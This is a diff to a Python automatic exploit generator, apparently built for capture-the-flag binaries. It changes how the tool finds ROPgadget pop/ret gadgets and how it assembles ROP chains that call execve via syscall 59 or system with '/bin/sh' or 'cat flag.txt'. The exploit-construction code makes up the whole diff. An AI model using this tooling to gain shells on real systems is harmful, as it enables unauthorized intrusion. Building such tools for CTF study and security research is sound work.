@@ -23,7 +23,8 @@ context.update(
 # Important lists to use
 strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
-arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
+#arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
+arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
 
 
@@ -172,7 +173,6 @@ class rAEG:
     # Find gadget to control register
     def find_reg_gadget(self, register):
         output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
-
         output.pop(0)
         output.pop(0)
         output.pop(-1)
@@ -187,12 +187,12 @@ class rAEG:
         min_gadget = output[0]
         min_instructions = output[0].count(b";") + 1
         for gadget in output:
-            instructions = gadget.count(b";")
+            instructions = gadget.count(b";") + 1
             if instructions < min_instructions:
                 min_instruction = instructions
                 min_gadget = gadget
 
-        logging.info(f"Found gadget for {register}: {min_gadget}")
+        log.info(f"Found gadget for {register}: {min_gadget}")
         return min_gadget
 
 
@@ -260,31 +260,48 @@ class rAEG:
         # If it is a syscall add pop rax, 59 for execve
         if function == "syscall":
             pop_rax_string= self.find_reg_gadget("rax")
+            instructions = pop_rax_string.split(b";")
             pops = pop_rax_string.count(b"pop")
-            pop_rax = pop_rax_string.split(b":")[0].strip()
-
+            pop_rax = p64(int(pop_rax_string.split(b":")[0].strip(),16))
             chain += pop_rax + p64(59)
-            while pops > 1:
-                chain += p64(0)
-                pops -= 1
 
-            print(pop_rax)
+            for instruction in instructions[1:]:
+                if b"ret" in instruction:
+                    break
+                print(instruction)
+                param = p64(0)
+                for i in range(len(parameters)):
+                    if arg_regs[i] in instruction:
+                        print(parameters[i])
+                        param = parameters[i]
+                chain += param
             # Get pop rax gadget or another gadget to control rax
             #break
         if len(parameters) > 0:
             for i in range(len(parameters)):
-                pop_reg_string = self.find_reg_gadget(arg_regs[i])
+                pop_reg_string = self.find_reg_gadget(arg_regs[i].decode())
+                instructions = pop_reg_string.split(b";")
                 pops = pop_reg_string.count(b"pop")
                 pop_reg = p64(int(pop_reg_string.split(b":")[0].strip(),16))
                 chain += pop_reg + parameters[i]
-                while pops > 1:
-                    chain += p64(0)
-                    pops -= 1
-                    print(pop_reg)
-                    print(pops)
+                print(instructions[1:])
+                for instruction in instructions[1:]:
+                    if b"ret" in instruction:
+                        break
+                    param = p64(0)
+                    for i in range(len(parameters)):
+                        if arg_regs[i] in instruction:
+                            print(arg_regs[i])
+                            param = parameters[i]
+                            break;
+                    chain += param
 
+
+
+
+        #chain += p64(self.elf.sym["_fini"])
         chain += p64(self.elf.sym[function])
-        print(chain)
+        log.info(f"Generated ROP chain {chain}")
 
         return chain
 
@@ -323,7 +340,8 @@ class rAEG:
         return None
 
     def exploit(self):
-        p = self.start_process(None)
+        p = self.start_process("GDB")
+        #p = self.start_process(None)
         if self.symbolic_padding != None:
             # Check if regular rop chain or libc leak
             # If there is a leak given then parse the leak
